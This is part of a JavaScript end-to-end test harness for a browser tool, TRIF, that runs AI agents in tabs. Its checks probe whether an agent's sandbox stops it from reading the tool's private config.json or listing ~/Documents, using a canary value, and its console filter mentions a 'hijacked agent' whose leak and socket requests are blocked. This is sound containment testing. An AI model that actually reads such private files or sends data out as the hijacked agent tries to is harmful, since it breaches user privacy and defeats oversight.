        await this.cli(['reload', '--url', `agent-${agent}`]);
        await this.waitPage('Codex\'s change on the page', (x) => /Codex was here/i.test(x.target || ''), 30000);
        await this.shot(this.pageCtx, `page-${agent}-mod`);
        await this.cli(['enable', '127.0.0.1/e2e-banner', '--url', '127.0.0.1']);
        return added.join(', ');
      });
    }

    await r.check(`${name}: knows which browser it's in`, async () => {
      const out = await this.cli(['agent', 'run', '--agent', agentId, '--tab', String(tab.id), ...(model ? ['--model', model] : []),
        'Which web browser is this tab in? Find out with trif if you need to, then answer with just the browser\'s name.'], { timeoutMs: 6 * 60000 });
      r.log(`browser question:\n${out.stdout}\n${out.stderr}`);
      const text = out.stdout.replace(/^session:.*$/m, '');
      if (!new RegExp(d.name, 'i').test(text)) throw new Error(`answer doesn't name ${d.name}: ${text.trim().slice(-400)}`);
      const wrong = d.name === 'Firefox' ? /\bChrome\b(?! ?extension)/ : /\bFirefox\b/;
      return wrong.test(text) ? { status: 'warn', detail: `names ${d.name} but also the other browser: ${text.trim().slice(-300)}` } : `answered ${d.name}`;
    });

    await r.check(`${name}: can't read TRIF's settings (the private folder) or ~/Documents`, async () => {
      const cfg = path.join(fs.realpathSync(this.priv), 'config.json');
      const out = await this.cli(['agent', 'run', '--agent', agentId, '--tab', String(tab.id), ...(model ? ['--model', model] : []),
        `This is a sandbox test. Using your tools, try to (1) print the contents of ${cfg} and (2) list the files in ~/Documents. Report exactly what each attempt returned, including error messages. Don't try to work around a refusal.`], { timeoutMs: 6 * 60000 });
      r.log(`privacy probe:\n${out.stdout}\n${out.stderr}`);
      const text = out.stdout + out.stderr;
      if (text.includes(this.canary)) throw new Error('the agent read config.json (the canary is in its answer)');
      const runs = path.join(this.priv, 'runs');
      const newest = fs.readdirSync(runs).filter((f) => f.endsWith('.jsonl')).map((f) => path.join(runs, f)).sort((a, b) => fs.statSync(b).mtimeMs - fs.statSync(a).mtimeMs)[0];
      const raw = newest ? fs.readFileSync(newest, 'utf8') : '';
      if (raw.includes(this.canary)) throw new Error(`the canary is in the run's raw output (${newest})`);
      const blocked = /Operation not permitted|not permitted|denied|permission|EPERM|blocked|sandbox/i.test(text + raw);
      const reply = text.replace(/^session:.*$/m, '').trim().split('\n').slice(-6).join(' ').slice(0, 400);
      return blocked ? `refused; reply: ${reply}` : { status: 'warn', detail: `canary not leaked, but no refusal seen; reply: ${reply}` };
    });

    await r.check(`${name}: macOS privacy (TCC) requests during the runs`, async () => {
      const tcc = this.tccLog(tccStart);
      fs.writeFileSync(this.r.file(`${this.label}-tcc-${agent}.txt`), tcc.raw);
      if (tcc.error) return { status: 'warn', detail: `couldn't read the TCC log: ${tcc.error}` };
      if (!tcc.requests.length) return 'none from the helper, its agents, codex or rg';
      // Folder-level privacy services (Documents, Desktop, Downloads…) are what can put a dialog on screen;
      // DeveloperTool and sandboxd's silent Full Disk Access check (Denied (Service Policy)) can't.
      const asked = tcc.requests.filter((q) => /Folder|Volumes|Downloads|Desktop|User Consent/.test(q));
      const detail = `${tcc.requests.length} decision(s):\n${tcc.requests.join('\n')}`;
      return asked.length ? { status: 'warn', detail } : { status: 'pass', detail };
    });
  }

  /**
   * TCC (macOS privacy) decisions since `start` for the helper and what it started (the agents count
   * as the helper's: it's their "responsible" process), and anything codex or rg asked for. Returns
   * {requests: ["<service>: <result> (<subject>)"], raw}. sandboxd's silent checks show up here too.
   */
  tccLog(start) {
    const fmt = (t) => {
      const p = (n) => String(n).padStart(2, '0');
      return `${t.getFullYear()}-${p(t.getMonth() + 1)}-${p(t.getDate())} ${p(t.getHours())}:${p(t.getMinutes())}:${p(t.getSeconds())}`;
    };
    const r = run('/usr/bin/log', ['show', '--info', '--predicate', 'subsystem == "com.apple.TCC"', '--start', fmt(start)], { timeoutMs: 180000 });
    if (r.status !== 0) return { error: (r.stderr || '').trim() || `exit ${r.status}`, raw: r.stdout + r.stderr, requests: [] };
    const lines = r.stdout.split('\n').filter((l) => l.includes('Handling access request to '));
    const ours = lines.filter((l) => l.includes(`pid=${this.helperPid},`) || /\b(codex|codex-path\/rg)\b/.test(l));
    const requests = [...new Set(ours.map((l) => {
      const m = /Handling access request to (\w+), from Sub:\{([^}]*)\}.*?Auth Right: ([^,]*?)\s*,/.exec(l);
      return m ? `${m[1]}: ${m[3]} (from ${m[2]})` : l.slice(l.indexOf('Handling')).slice(0, 300);
    }))];
    return { raw: ours.join('\n') + '\n', requests };
  }

  async consoleCheck() {
    // The helper stopped and user scripts turned off on purpose (colourChecks): the background's warnings
    // about either are expected.
    const expected = (p) => p.level === 'warn' && ((this.helperStopped && /helper disconnected|native messaging host/i.test(String(p.text)))
      || (this.scriptsRevoked && /user scripts were turned off/.test(String(p.text))))
      // the hijacked agent's requests, which the tab lock blocked on purpose (hijackedAgentCheck)
      // (Firefox doesn't say which page: after that check, a failed fetch or socket is one of those)
      // (the sandboxed mods' test page: its hostile mod's refusals and the errors the good one throws on purpose)
      // (Chrome names the page the tab had when its console was first attached, so by the text)
      || (this.sandboxPage && (/^\[TRIF\] 127\.0\.0\.1\/e2e-(sbx|pw)/.test(String(p.text)) || /willReadFrequently/.test(String(p.text)) || /AudioContext was not allowed to start/.test(String(p.text)) || /\/sandbox\.html/.test(String(p.source || ''))))
      || (this.hijacked && /ERR_BLOCKED_BY_CLIENT|NetworkError when attempting to fetch|Failed to fetch|establish a connection to the server at ws:\/\/[^ ]+\/e2e-socket|WebSocket connection to '[^']+\/e2e-socket|e2e-leak|e2e-nav|blocked by|CORS/i.test(String(p.text) + String(p.source || '')));
    const problems = (await this.d.consoleProblems()).filter((p) => !expected(p));
    // The agent-made mod and the stand-in pages aren't ours to judge; everything else counts.
    const lines = problems.map((p) => `${p.level} [${p.from}] ${String(p.text).slice(0, 300)}${p.source ? ` (${String(p.source).slice(0, 120)})` : ''}`);
    fs.writeFileSync(this.r.file(`${this.label}-console.txt`), lines.join('\n') + '\n');
    const errors = problems.filter((p) => p.level === 'error');
    if (errors.length) throw new Error(`${errors.length} error(s), ${problems.length - errors.length} warning(s):\n${lines.slice(0, 15).join('\n')}`);
    if (problems.length) return { status: 'warn', detail: `${problems.length} warning(s):\n${lines.slice(0, 15).join('\n')}` };
    return 'none';
  }

  /**
   * A set just over the 1 MB one native message can carry in Chrome and Firefox: a 1 MB mod (a base64
   * string, like a mod with a sound in it) and 0.4 MB of functions, on the test site, which is on. It goes
   * in parts and runs; a change to the small one goes without the big one's code (modsSame) and the big one
   * still runs; a mod over the 4 MB cap isn't sent and `trif status` and `trif doctor` say why; removed, they
   * go. This stays small on purpose (a 48 MB set once took headless Firefox to 7.4 GB and the Mac ran out of
   * memory): tests/e2e/measure-big-mods.js measures sets up to the 16 MB cap, separately.
   */
  async bigModsCheck() {
    const dir = path.join(this.trif, 'sites', '127.0.0.1');
    const log = path.join(this.priv, 'helper.log');
    const size = () => fs.statSync(log).size;
    const since = (at) => { const b = fs.readFileSync(log); return b.subarray(at).toString('utf8'); };
    const BIG = 1024 * 1024;
    const bigMod = (tag) => {
      const d = crypto.randomBytes(BIG * 3 / 4).toString('base64');
      return `// ==WebMod==\n// @name E2E Big\n// ==/WebMod==\nconst d = "${d}";\ndocument.documentElement.dataset.trifE2eBig = "${tag}:" + d.length;\n`;
    };
    const fns = [];
    for (let i = 0, n = 0; n < 0.4 * 1024 * 1024; i++) { const f = `function f${i}(a) { const x = a * ${i} + ${i % 13}; return x % 7 === 3 ? String(x) + "${crypto.randomBytes(12).toString('hex')}" : x; }\n`; fns.push(f); n += f.length; }
    const codeMod = (tag) => `// ==WebMod==\n// @name E2E Code\n// ==/WebMod==\n${fns.join('')}let s = 0;\n${fns.map((_, i) => `s += String(f${i}(${i})).length;`).join('\n')}\ndocument.documentElement.dataset.trifE2eCode = "${tag}:" + s;\n`;
    const want = String(fns.reduce((n, f, i) => n + String(new Function(`${f}; return f${i}(${i});`)()).length, 0));
    const state = () => this.page(`async () => ({ big: document.documentElement.dataset.trifE2eBig || null, code: document.documentElement.dataset.trifE2eCode || null, huge: document.documentElement.dataset.trifE2eHuge || null, banner: document.documentElement.dataset.trifE2e || null, nav: Math.round(performance.getEntriesByType('navigation')[0]?.domContentLoadedEventEnd || 0) })`);
    const SENT = /sent (\d+) mod\(s\) to the extension(?: \(\d+ held\))?(?: \((\d+) it has already, without their code\))?, (\d+) KB(?: in (\d+) parts)?/;
    // From the write to the extension's modsApplied (its "registered" line in the helper's log).
    const delivered = async (what, write, pred) => {
      const at = size();
      const t0 = Date.now();
      write();
      const text = await waitFor(`the helper to send ${what} and the extension to apply it`, () => {
        const t = since(at);
        const sent = SENT.exec(t);
        return sent && pred({ same: Number(sent[2] || 0), kb: Number(sent[3]), parts: Number(sent[4] || 0) }) && /extension registered \d+ mod\(s\)/.test(t.slice(sent.index)) ? t : null;
      }, { timeoutMs: 30000, intervalMs: 50 });
      const sent = SENT.exec(text);
      return { ms: Date.now() - t0, same: Number(sent[2] || 0), kb: Number(sent[3]), parts: Number(sent[4] || 0) };
    };
    const reload = async (pred) => {
      await this.ext(`async (id) => { await chrome.tabs.reload(id); }`, [this.win.tabId]);
      return waitFor('the test page with the big mods', async () => {
        this.pageCtx = await this.d.findPage((u) => u.startsWith(this.pageUrlPrefix), { timeoutMs: 5000 });
        const s = await state();
        return pred(s) ? s : null;
      }, { timeoutMs: 30000 });
    };
    const files = ['e2e-big.js', 'e2e-code.js', 'e2e-huge.js'].map((f) => path.join(dir, f));
    try {
      const first = await delivered('the big set', () => { fs.writeFileSync(files[0], bigMod('v1')); fs.writeFileSync(files[1], codeMod('v1')); }, (m) => m.parts > 1);
      const p1 = await reload((s) => s.big === `v1:${BIG}` && s.code === `v1:${want}` && s.banner === 'ran');
      // A change to the small one: the big one goes without its code, and still runs.
      const change = await delivered('the changed set', () => fs.writeFileSync(files[1], codeMod('v2')), (m) => m.same >= 1);
      if (change.parts || change.kb > 1024) throw new Error(`a change to the 0.4 MB mod sent ${change.kb} KB${change.parts ? ` in ${change.parts} parts` : ''}`);
      await reload((s) => s.big === `v1:${BIG}` && s.code === `v2:${want}`);
      // Over the cap: not sent, and said why.
      fs.writeFileSync(files[2], `// ==WebMod==\n// @name E2E Huge\n// ==/WebMod==\n/*${'x'.repeat(4 * 1024 * 1024)}*/\ndocument.documentElement.dataset.trifE2eHuge = "ran";\n`);
      const huge = await waitFor('trif status to say the huge mod was not sent', async () => {
        const st = (await this.cli(['status'], { json: true })).json;
        return (st?.helper?.modErrors || []).find((e) => e.id === '127.0.0.1/e2e-huge') || null;
      }, { timeoutMs: 15000 });
      if (huge.limit !== 'mod' || !/a mod can be up to 4 MB/.test(huge.error)) throw new Error(`huge: ${JSON.stringify(huge)}`);
      const doc = (await this.cli(['doctor'], { json: true, timeoutMs: 60000 })).json;
      const check = (doc?.checks || []).find((c) => /e2e-huge/.test(c.title));
      if (!check || check.status !== 'fail' || !/keep sounds, pictures/.test(check.fix || '')) throw new Error(`trif doctor: ${JSON.stringify(check)}`);
      const p2 = await reload((s) => s.big === `v1:${BIG}` && s.code === `v2:${want}`);
      if (p2.huge) throw new Error('the mod over the cap ran');
      const status = (await this.cli(['status'], { json: true })).json;
      const errs = [...((status?.helper?.modErrors || []).filter((e) => e.id !== '127.0.0.1/e2e-huge')), ...((status?.helper?.modsApplied || {}).errors || [])].filter((e) => /e2e-(big|code)/.test(e.id));
      if (errs.length) throw new Error(`errors: ${JSON.stringify(errs).slice(0, 300)}`);
      const gone = await delivered('the set without them', () => files.forEach((f) => fs.rmSync(f, { force: true })), (m) => !m.parts);
      await reload((s) => !s.big && !s.code && s.banner === 'ran');
      return `${first.kb} KB in ${first.parts} parts, applied ${first.ms} ms after the write, page DOMContentLoaded ${p1.nav} ms; a change to the small mod: ${change.kb} KB (${change.same} sent without code), ${change.ms} ms; over 4 MB: not sent ("${huge.error.slice(0, 60)}…"); removed: ${gone.ms} ms`;
    } finally {
      for (const f of files) fs.rmSync(f, { force: true });
    }
  }

  async helperLogCheck() {
    const file = path.join(this.priv, 'helper.log');
    if (!fs.existsSync(file)) return { status: 'skip', detail: 'no helper.log' };
    const lines = fs.readFileSync(file, 'utf8').split('\n');
    fs.copyFileSync(file, this.r.file(`${this.label}-helper.log`));
    // Before the harness allows user scripts, every sync logs that each mod couldn't register: expected.
    const expected = (l) => /User scripts aren't allowed for TRIF|User scripts are off for TRIF/.test(l) // Firefox's wording, Chrome's
      || (this.scriptsRevoked && /user scripts were turned off/.test(l)) // colourChecks turned them off
      || /mod 127\.0\.0\.1\/e2e-huge: mod is [\d.]+ MB; a mod can be up to 4 MB/.test(l) // bigModsCheck's, over the cap on purpose
      || /WARN stdout error \(EPIPE\); \w+ went away/.test(l) // (the harness quit the browser while the helper was writing to it)
      || /mod 127\.0\.0\.1\/e2e-rules-bad: .*only data:/.test(l); // rulesModCheck's, refused on purpose
    const skipped = lines.filter(expected).length;
    const bad = lines.filter((l) => !expected(l) && /\b(WARN|ERROR|warn|error)\b/.test(l.slice(0, 60)));
    const errors = bad.filter((l) => /\bERROR\b|\berror\b/.test(l.slice(0, 60)));
    if (errors.length) throw new Error(`${errors.length} error line(s):\n${errors.slice(0, 10).join('\n')}`);
    if (bad.length) return { status: 'warn', detail: `${bad.length} warning line(s):\n${bad.slice(0, 10).join('\n')}` };
    return `${lines.length} lines, none at warn/error${skipped ? ` (besides ${skipped} "user scripts aren't allowed" lines from before the harness allowed them)` : ''}`;
  }
}

module.exports = { Scenario, REAL_HOME };
